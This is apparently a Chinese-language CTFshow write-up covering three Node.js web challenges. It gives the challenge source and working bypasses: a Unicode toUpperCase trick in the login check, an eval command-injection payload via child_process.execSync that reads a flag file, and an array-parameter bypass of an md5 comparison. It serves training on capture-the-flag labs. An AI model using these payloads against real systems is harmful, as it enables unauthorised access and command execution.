CTFSHOW–nodejs刷题记录

web334

题目又一个压缩包，解压看到一个login.js文件和user.js文件：

login.js:

var express = require('express');
var router = express.Router();
var users = require('../modules/user').items;
 
var findUser = function(name, password){
  return users.find(function(item){
    return name!=='CTFSHOW' && item.username === name.toUpperCase() && item.password === password;
  });
};

/* GET home page. */
router.post('/', function(req, res, next) {
  res.type('html');
  var flag='flag_here';
  var sess = req.session;
  var user = findUser(req.body.username, req.body.password);
 
  if(user){
    req.session.regenerate(function(err) {
      if(err){
        return res.json({ret_code: 2, ret_msg: '登录失败'});        
      }
       
      req.session.loginUser = user.username;
      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              
    });
  }else{
    res.json({ret_code: 1, ret_msg: '账号或密码错误'});
  }  
  
});

module.exports = router;

user.js:

module.exports = {
  items: [
    {username: 'CTFSHOW', password: '123456'}
  ]
};

这段代码要求用户名为CTFSHOW,密码为123456，但在login.js中检测用户名不等于CTFSHOW，然后经过大写转换之后再等于CTFSHOW,考点是nodejs的大写转换漏洞：

Nodejs常见漏洞 | RoboTerh

toUpperCase(): 将小写转换为大写的函数；前者可以将ı转换为I, 将 ſ转为为S。

toLowerCase(): 将大写转换为小写的函数:可以将İ转换为i, 将 K 转换为 k

用ſ替换CTFSHOW中的s即可。

web335

打开页面，在源码看到一个参数/eval=，发现会将传入的参数显示，猜测是命令执行：

  1. child_process.exec(): 这个函数可用于执行外部命令，并通过回调函数返回执行结果。它可以执行简单的命令，并返回标准输出和标准错误输出。例子：

    javascript

    复制

    const { exec } = require('child_process');

exec('ls -l', (error, stdout, stderr) => {
  if (error) {
    console.error(`执行命令出错: ${error}`);
    return;
  }
  console.log(`标准输出: ${stdout}`);
  console.error(`标准错误输出: ${stderr}`);
});
```

  2. child_process.spawn(): 这个函数也可用于执行外部命令，但它返回一个可写流。通过监听流的事件来获取命令执行结果。它适用于需要实时处理命令输出的情况。例子：

    javascript

    复制

    const { spawn } = require('child_process');

const child = spawn('ls', ['-l']);

child.stdout.on('data', (data) => {
  console.log(`标准输出: ${data}`);
});

child.stderr.on('data', (data) => {
  console.error(`标准错误输出: ${data}`);
});

child.on('close', (code) => {
  console.log(`子进程退出码: ${code}`);
});
```

  3. child_process.execFile(): 这个函数用于执行可执行文件，而不是通过 shell 执行命令。它类似于 child_process.exec()，但不需要通过 shell 解析命令。例子：

    javascript

    复制

    const { execFile } = require('child_process');

execFile('ls', ['-l'], (error, stdout, stderr) => {
  if (error) {
    console.error(`执行命令出错: ${error}`);
    return;
  }
  console.log(`标准输出: ${stdout}`);
  console.error(`标准错误输出: ${stderr}`);
});
```

这些是 Node.js 中常见的用于执行命令的函数。

所以我们用：require('child_process').execSync('cat fl00g.txt').toString()来执行代码；便可以执行代码。

web337

题目给了一段源代码：

var express = require('express');
var router = express.Router();
var crypto = require('crypto');

function md5(s) {
  return crypto.createHash('md5')
    .update(s)
    .digest('hex');
}

/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var flag='xxxxxxx';
  var a = req.query.a;
  var b = req.query.b;
  if(a && b && a.length===b.length && a!==b && md5(a+flag)===md5(b+flag)){
  	res.end(flag);
  }else{
  	res.render('index',{ msg: 'tql'});
  }
  
});

module.exports = router;

这段代码表示我们get传入的a和b的值与flag在进行md5加密过后的长度相同，但a与b不相同，所以用数组绕过即可：

a[x]=1&b[x]=2
